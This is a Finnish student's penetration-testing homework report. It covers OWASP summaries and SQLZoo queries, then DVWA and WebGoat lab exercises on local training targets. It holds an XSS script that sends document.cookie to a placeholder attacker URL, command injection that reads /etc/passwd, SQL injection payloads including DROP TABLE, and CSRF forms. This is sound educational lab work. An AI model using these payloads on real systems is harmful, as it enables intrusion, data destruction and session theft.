# H3

Tehtävän annot löytyvät [opettajan](https://terokarvinen.com/2022/tunkeutumistestaus-ict4tn027-3010-syksylla-2022/#h3-select-pwned) sivulta

## x) Lue/katso/kuuntele ja tiivistä

#### [OWASP TOP 10](https://terokarvinen.com/2022/tunkeutumistestaus-ict4tn027-3010-syksylla-2022/owasp-top-10-2017.pdf)

* A2 Broken Authentication
  * Credental stuffing sisältää tunnettuja salasanoja
  * ei ole kirjautu ulos sivulta jolloin hyökkääjä käyttää samaa sivua ja edellinen on siltikin varmennettu
* A3 Sensitive Data Exposure
  * man-in-middle hyökkäys
  * varastaa tietoa palvelimelta kun se liikkuu 
  * brute force 
* A7 Cross Site Scripting
  *  syötetään skripti sivulle  


#### [Percival & Samancioglu 2020: The Complete Ethical Hacking Course videot](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1/)

* reflected xss
  * manipuloidaan URL joka lähetetään uhreille 
* stored xxs
  * skritpi on sivun muistissa, kuka tahansa joka avaa sivun käynnistää skriptin automaattisesti.
* Suojautumis tavat
  * Google -> settings -> privacy -> content settings -> javascript pois päältä


## y) Cross site story

XSS hyökkäys alkaa siitä kun hakkeri huomaa nettisivulta haavoittuvuuden. 

Sanotaan että blogi sivulla on haavoittovuus ja hakkeri haluaa sivun istunto keksi. Tämä ajaa blogin kommentti kenttään javascript koodin esimerkiksi:

```
<script>
document.write("<img scr="[URL]?c='+document.cookie+'" />');
</script>
```

*URL kohtaan tulee hakkerin osoite johon lähetetään kaapatut tiedot*

Kohde löytää saman linkin samaan blogi sivustoon, tämän avaamisen jälkeen skripti suoriutuu automaattisestin. Tällöin kohteen istunto menee hakkerin käislle, jonka jälkeen hakkeri saa kohteen istunnon käyttöön

**Tiivistettynä**

Hyökkääjä ajaa skriptin sivustolle, tämä jää sen tietokantaa. Sen jälkeen jokainen joka avaa kyseisen sivun skripti aktivoituu ja tiedot menevät hyökkääjälle

![image](https://user-images.githubusercontent.com/93308960/200964967-8d8ef754-3ccf-405f-bd04-2f2df10651cb.png)


## a) SELECT * FROM student

 [SQLZOO](https://sqlzoo.net/wiki/SQL_Tutorial) sivuston tehtävät SELECT basic ja SELECT from world 1-5
 
 ### SELECT basic 
 
 Kaikissa tehtävissä oli laitettu laitettu valmiiksi koodi, itse piti muokaa se tehtävän annon mukaisestin.
 
 
 1) Tehtävässä piti saada tulostettua saksan väkiluku. Muutin vain WHERE kohdasta ranskan saksaksi eli `WHERE name = 'France'` -> `WHERE name = 'Germany'`

Lopullinen koodi ja tulos: 

 ```
SELECT population From world 
    WHERE name = 'Germany'
 ```
 
 ![image](https://user-images.githubusercontent.com/93308960/200621827-a776a9d6-7868-4f72-89e2-d6604bcd86b9.png)

2) Piti tulostaa tanskan, norjan ja ruotsin nimet ja väkiluku. Tehtävässä opeteltiin käyttämään `IN` avainsanaa (operator). 

Muutin alkuperiäset maat tehtävän annon mukaisestin `WHERE name IN ('Brazil', 'Russia', 'India', 'China');` -> `WHERE name IN ('Sweden', 'Norway', 'Denmark');`

Lopullinen koodi ja tulos:

 ```
 SELECT name, population FROM world
  WHERE name IN ('Sweden', 'Norway', 'Denmark');
 ```
 
 ![image](https://user-images.githubusercontent.com/93308960/200622997-81448055-f286-4173-aef0-98f4a5f517c1.png)

 3) Piti tulostaa joitten maan ja alueen niille maille, joiden pinta-ala on 200 000 – 250 000, maiden nimet mukaan lukien. Tehtävässä opeteltiin käyttämään `BETWEEN` avainsanaa (operator).

Korvasin alkuperäiset numerot, tehtävän annon numeroiksi `WHERE area BETWEEN 250000 AND 300000` ->  `WHERE area BETWEEN 200000 AND 250000`

Lopullinen koodi ja tulos:

```
SELECT name, area FROM world
  WHERE area BETWEEN 200000 AND 250000
```

 ![image](https://user-images.githubusercontent.com/93308960/200628623-a10dcef9-8421-4f2c-87c7-1d16855bea5b.png)
 

 ### SELECT from world 1-5

Tässä taas piti itse keksiä koodit tehtävän annon mukaisestin.

1) Ensimmäinen tehtävä oli helppo, piti saada tulostettua maitten nimi, manner ja väkiluku

Ratkaisu:

```
SELECT name, continent, population FROM world
```

![image](https://user-images.githubusercontent.com/93308960/200630006-937fe501-968c-46a2-be90-e80c8e91821e.png)

2) Piti saada maitten nimet esille joiden väkiluku on vähintään 200 miljoonaa. 



Ratkaisu:

```
SELECT name FROM world
WHERE population > 200000000

```

![image](https://user-images.githubusercontent.com/93308960/200631629-dc3616a5-3f1e-46c9-bd4e-1a600dd38a9b.png)


3) Piti saada maitten nimet esille joiden per capitan GDP väkiluku on vähintään 200 miljoonaa. 

Ratkaisun koodin pohja oli samallainen kun edellisen tehtävän mutta gdp kohdassa katosoin apua tehtävässä olevasta videosta. En aluksi oikein hahmottanut mihin gdp tulee laittaa.

Ratkaisu:

```
SELECT name, gdp/population 
FROM world
WHERE population>200000000
```

![image](https://user-images.githubusercontent.com/93308960/200631575-85a6627f-a450-4258-8da5-43c5f793ab7a.png)


4) Piti saada maitten nimet väkiluku joka on jaettu 1000000 ja joiden maanosa on etelä amerikka.

Sain hyvin ratkaistua sen miten tulosksena saadaan maitten nimet `SELECT name` ja miten se valitsee etelä amerikka maanosat `WHERE continent = 'Shout America`. Väkiluku oli vaikeempi osuus aluksi luulin että se pitäisi olla WHEREn kanssa, mutta sehän ei toiminut. Sain vastauksen tehtävää [weeblike](https://weeblike.weebly.com/select-from-world.html) sivulta.

Ratkaisu:

```
SELECT name, population/1000000  FROM world
WHERE continent = 'South America'

```
![image](https://user-images.githubusercontent.com/93308960/200631516-884e58c3-1b94-4e56-a25d-4f153dc537df.png)


5) Tehtävässä piti saada maitten nimi ja väkiluku esille. 

Tämä oli helppo tehtävä, koodi oli samanlainen kun basic osion toinen tehtävän. SELECT kohtaan piti nimen lisäksi lisätä väkiluku.

Ratkaisu:

```
SELECT name, population FROM world
WHERE name IN ('france', 'germany', 'italy')
```

![image](https://user-images.githubusercontent.com/93308960/200631450-9dc53b97-4ebf-42a3-8828-8acfe7e66ddd.png)

## b) Darn Low Security

Laitoin Metasploitablen 2 koneen ip-osoitteen selaimeen jolloin avautui alla olevan näköinen sivu, siitä klikkasin DVWA. Kirjauduin admin tunnuksilla.

![image](https://user-images.githubusercontent.com/93308960/200914056-e74b24eb-37c5-4814-9dde-dcd7e6dbf15e.png)

Vasemmassa sivu palkissa näkyi dvwa security josta pääsin muokkaa `DVWA Security` low

![image](https://user-images.githubusercontent.com/93308960/200851529-b373dcb9-3921-4561-ab61-8f3396d37b43.png)



## c) Execute! 

*en oikein tiiä teinkö tehtävän oikein*

Avasin command execution sivun johon ajoin pari komentoa kuten:

`localhost & whoami` komento teki ping ja kertoi ketä olemme 

![image](https://user-images.githubusercontent.com/93308960/200914686-f60b8e7a-f3bd-4be4-994c-ba99240f1125.png)

`cat /etc/passwd` komennolla sain salasanat esille.

![image](https://user-images.githubusercontent.com/93308960/200915095-148fb04d-db8f-4586-a75a-1c3bc5172e6e.png)



## d) Webgoat

#### A1 Injection

Saatiin tieto mihin osastoon Franco kuuluu

`SELECT department FROM employees WHERE last_name='Franco'`
 
![image](https://user-images.githubusercontent.com/93308960/200837134-ed1743a4-69e9-47e5-a187-7f3807852d58.png)

Vaihdettiin Barnettin osasto sales

`SELECT department SET employees='sales' WHERE last_name='Barnett'`

![image](https://user-images.githubusercontent.com/93308960/200837632-2630cded-3981-429f-a064-15c898afa6da.png)

Lisättiin employees tauluun colummi phone 

`ALTER TABLE employees ADD phone varchar(20)`

![image](https://user-images.githubusercontent.com/93308960/200837872-5ecab5d9-afb5-4e29-880d-ca9a0c199758.png)

Annettiin oikeudet UnauthorizedUser nimiselle käyttäjälle

`GRANT ALTER TABLE TO UnauthorizedUser;`

![image](https://user-images.githubusercontent.com/93308960/200838160-92c3b63d-80aa-4ed5-aa6a-de7af7656cd4.png)

Lopuissa jouduin katsomaan ohjeita [YouTube](https://www.youtube.com/watch?v=C_-ea63FUto) videosta

`user or 1=1`

![image](https://user-images.githubusercontent.com/93308960/200838673-9dd75de3-09e3-4fc9-8326-d39940f6a96a.png)

`Smith' or 1=1 --`

![image](https://user-images.githubusercontent.com/93308960/200839530-eedffe66-8257-4450-a1fb-7a40de0d56e7.png)

Vaikka katsoinki apua en saanut toimimaan kahta vikaa tehtävää.

`3SL99A' ; UPDATE employees SET salary=200000 WHERE auth_tan='3SL99A'`

![image](https://user-images.githubusercontent.com/93308960/200842622-ac0fc328-68f3-42c0-a7be-d5f58f0b3573.png)

`UPDATE; DROP TABLE access_log`

![image](https://user-images.githubusercontent.com/93308960/200842522-2ed32fd3-0339-4dca-a626-c2ea76fe032d.png)



#### A2 Broken authentication

Tehtävässä piti ohittaa turvakysymykset 

*Tähän tehtävään latasin Burb suite nimisen ohjelman.* 

 Avasin burp suten kautta selaimen webgoat sivun, tällöin heti sovellukseen tuli http historia. Tein aluksi tehtävän sivulla annetun mallin mukaan. 
 
 Painoin sivulla submit painiketta ja menin takaisin burp sovellukseen. Huomasin POST pyynnön ja vein sen Repeater.

![image](https://user-images.githubusercontent.com/93308960/200806221-86af7948-cab6-4edc-8dc5-a78352c4c562.png)

Koitin aluksi poistaa turvakysymykset mutta se ei onnistunut, niin kuin mallissa oltiin tehty.

![image](https://user-images.githubusercontent.com/93308960/200806781-10bbd94f-c61f-4d5e-b7cf-94a765f0cc82.png)

Lisäsin kysymykset takaisin ja pähkäilyn jälkeen muokkaamalla turvakysymyksiä pääsee ohittamaan ne. Lisäsin a kirjaimen molempiin `secQuestion` sanaa

```
secQuestion0=abc&secQuestion1=abcd --> secQuestiona0=abc&secQuestiona1=abcd
```
 
![image](https://user-images.githubusercontent.com/93308960/200807254-c1920ff7-48d7-40a2-9bec-83714f5d7a72.png)

Menin takaisin http historia ja sieltä intercept välilehdelle jossa muokkasin kysymykset 

```
secQuestion0=abc&secQuestion1=abcd --> secQuestiona0=abc&secQuestiona1=abcd
```
Tämän jälkeen painoin Forward joka lähettää pyynnön sivulle.

![image](https://user-images.githubusercontent.com/93308960/200808155-ce83a53c-8acd-4b01-ac3f-01077e491b3d.png)

Tämä onnistui ja saatiin ohitettua kysymykset

![image](https://user-images.githubusercontent.com/93308960/200807383-36a30de8-8823-4805-94b7-f72a72d7e7a0.png)


#### A3 Sensitive data exposure

Avasin devtool ja menin network välilehdelle. Tämän jälkeen klikkasin sivulla olevaa Log in, jolloin tuli uusi POST pyyntö. Sen pyynnön sisällä oli käyttäjä ja salasana 

![image](https://user-images.githubusercontent.com/93308960/200793457-f6febc9e-c132-405d-92f1-e8c1fd33fad9.png)


#### A7 Cross Site Scripting (XSS)

2) Ensimmäisessä tehtävässä piti laittaa selaimeen `javascript:alert(dokument.cookie);` jonka seurauksena pitäisi tulla pop-up ikkuna joka sisältää istunta keksin. Minulla se ei jostain syystä onnistunut, yritin monta kertaa avata uuden välilehden ja siinä ajaa koodin mutta ei onnistunut. Sammutin nykyiset sivut ja avasin kokonaan uudet sivut, siltikään ei onnistunut. Tähän en saanut vastausta. 

![image](https://user-images.githubusercontent.com/93308960/200810596-1ea06f65-68d4-4293-885f-8c83208a6590.png)

7) Piti löytää haavoittunut kohta ja ajaa javascript koodi käyttäen `alert()` tai `console()`.

Käytin alert() ja tein skriptin `<scripti>alert(vulnerable)</scripti>`, kun ajan koodin niin tulee esille popup ikkuna jossa sanotaan vulnerable

* Ensimmäisissä kokeiluissa oli jäänyt ; merkki jonka takia sivusto ei hyväksynyt sitä aikaisemmin eli koodi näytti tältä <script>alert("vulnerable");</script>*

![image](https://user-images.githubusercontent.com/93308960/200814191-305807f6-651a-46e5-86a2-89c9925563ff.png)



#### A8:2013 Request Forgeries

3) Tehtävässä piti saada lipun numero

Ensin sivustolla piti klikata `Submit Query` painiketta jolloin avautui uusi sivu *(alla oleva kuva)*. Tämän jälkeen avasin selaimen oman devtool työkalun eli f12. Menin network välilehdelle ja päivitin sivun uudelleen, jolloin tuli POST pyyntö. Network headerista löytyi uusi nettisivun osoite, yritin avata sen uudelle välilehdelle mutta tuloksetta. Tähän sitten jäin jumiikin kunnes löysin [Medium](https://medium.com/@evidencemonday/webgoat-cross-site-request-forgery-solution-1c069985e80f) sivulta vastauksen. 

Piti tehdä oma html tiedosto joka sitten sisältää tämän löydetyn osoitteen.
Sivun koodi oli:

```
<html>
<body>
 <form action="http://localhost:8000/WebGoat/csrf/basic-get-flag" method="POST">
  <input name="csrf" value="false" type="hidden">
  <input name="submit" type="hidden" value="submit-Query">
  <input type="submit" value="Submit">
 </form>
</body>
</html>
```

![image](https://user-images.githubusercontent.com/93308960/200825878-e1f70fd3-31d7-4af8-b026-a7eceea1915e.png)

Tiedosto tallennettiin `crsf.html` muotoon ja sen jälkeen avattiin. Tällöin avautui uusi nettisivu josta saatiin lipun numero.

![image](https://user-images.githubusercontent.com/93308960/200825740-2b32d85a-65af-4b52-a594-f2e0f6e51d9f.png)



4) 

Alotin tehtävän samanlailla kun edellisen. Avasin devtool ja kikkasin sivulla olevaa `submit review` jolloin saatiin uusi POST pyyntö ja joka sisälsi uuden sivun. Tässäkin koodattiin uusi html sivu joten käytin pohjana edellisen tehtävän koodia.

```
<html>
<body>
 <form action="http://localhost:8000/WebGoat/csrf/basic-get-flag" method="POST" enctype="application/x-www-form-urlencoded; charset=UTF-8">
 <input type="hidden" name="reviewText" value="Bets. App. Ever" >
  <input type="hidden" name="star" type ="text" value="5" >
  <input type="hidden" name="validateReq"  value="2aa14227b9a13d0bede0388a7fb">
  <input type="hidden" type="submit" value="Submit review">
 </form>
</body>
</html>
```
   * Sivun osoite eli action kohta saatiin devtool -> network -> header
   * sisällystyyppi eli enctype kohta saatiin samasta devtool -> network -> header
   
![image](https://user-images.githubusercontent.com/93308960/200836243-9e5bf5da-bf04-4195-a1be-b421d7d82c59.png)

   * validateReq kohta saatiin devtool -> network -> request
   
![image](https://user-images.githubusercontent.com/93308960/200836024-d7d95333-c5b7-4f8e-ab20-a6ebed30e02f.png)
   
No tämä koodi ei toiminut, tulokseksi tuli vain tyhjä sivu. En oikeen saanut kiinni mistä tämä johtui. 

![image](https://user-images.githubusercontent.com/93308960/200832087-8c5098af-19fa-4605-bc2c-91fc2ce3e427.png)

katsoin apua ja löysin [YouTube](https://youtu.be/oOtJEJvSkoU?t=516) videon josta otin mallia koodi pätkästä

```
<html>
<body>
 <form action="http://localhost:8000/WebGoat/csrf/basic-get-flag" method="POST" enctype="application/x-www-form-urlencoded; charset=UTF-8">
 < name="reviewText" value="medium" input type="hidden">
 < name="star" type ="text" value="3" input type="hidden">
 <name="validateReq"  value="2aa14227b9a13d0bede0388a7fb" input type="hidden">
 <type="submit" value="Submit review">
</body>
</html>
```
![image](https://user-images.githubusercontent.com/93308960/200835797-5dd8ae4d-9335-47b6-86dc-bed81cfb1e6d.png)

Tallensin tiedoston ja sain toimii.

![image](https://user-images.githubusercontent.com/93308960/200835070-fd2a2b4f-8dad-4600-8613-c4dfa934ab20.png)



## Lähteet

https://www.youtube.com/watch?v=oOtJEJvSkoU

https://www.youtube.com/watch?v=oOtJEJvSkoU&t=516s

https://medium.com/@evidencemonday/webgoat-cross-site-request-forgery-solution-1c069985e80f

https://www.synopsys.com/glossary/what-is-cross-site-scripting.html

https://brightsec.com/blog/xss-attack/

https://terokarvinen.com/2022/tunkeutumistestaus-ict4tn027-3010-syksylla-2022/

https://www.youtube.com/watch?v=UXtxfka2TuY

https://www.w3schools.com/tags/att_form_enctype.asp

https://www.w3schools.com/sql/sql_injection.asp

https://www.youtube.com/watch?v=C_-ea63FUto

https://terokarvinen.com/2022/tunkeutumistestaus-ict4tn027-3010-syksylla-2022/owasp-top-10-2017.pdf

https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_5/
